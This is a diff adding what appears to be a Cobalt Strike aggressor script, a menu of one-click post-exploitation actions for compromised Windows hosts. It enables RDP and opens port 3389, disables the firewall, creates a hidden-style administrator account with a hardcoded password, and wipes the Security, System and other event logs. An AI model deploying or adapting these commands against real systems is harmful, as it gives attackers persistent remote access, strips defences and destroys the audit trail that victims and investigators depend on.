@@ -1,0 +1,62 @@
+popup beacon_bottom {
+	menu "3389工具" {
+		menu "RDP" {
+			item "开启3389" {
+				blog($1, "[*] Open RDP Server ");
+				bshell($1, "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+				blog($1, "[*] Open 3389 Port ");
+				bshell($1, "REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
+			");
+			}
+			item "关闭3389" {
+				blog($1, "[*] Close RDP Server ");
+				bshell($1, "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000001 /f");
+			}
+			
+		}
+		menu "防火墙" {
+			item "3389策略" {
+				blog($1, "[*] 允许3389通过 ");
+				bshell($1, "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
+			}
+			item "关闭防火墙" {
+				blog($1, "[*] 关闭防火墙 ");
+				bshell($1, "netsh advfirewall set allprofiles state off");
+			}
+			item "打开防火墙" {
+				blog($1, "[*] 打开防火墙 ");
+				bshell($1, "netsh advfirewall set allprofiles state on");
+			}
+		}
+		menu "用户操作" {
+			item "添加用户" {
+				blog($1, "[*] Add User");
+				blog("用户名: xiaohei$  密码: Xiaohei123.");
+				bshell($1, "net user xiaohei$ Xiaohei123. /add");
+				blog($1, "[*] Add Group of Administrators");
+				bshell($1, "net localgroup administrators xiaohei$ /add");
+			}
+			item "删除新增用户" {
+				blog($1, "[*] Del User");
+				bshell($1, "net user xiaohei$ /del");
+			}
+		}
+		menu "日志清除" {
+			item "清除 Application" {
+				bshell($1, "wevtutil cl Application");
+			}
+			item "清除 Security" {
+				bshell($1, "wevtutil cl Security");
+			}
+			item "清除 Setup" {
+				bshell($1, "wevtutil cl Setup");
+			}
+			item "清除 System" {
+				bshell($1, "wevtutil cl System");
+			}
+			item "清除 Forwarded Events" {
+				bshell($1, "wevtutil cl Forwarded Events");
+			}
+		}
+	}
+}
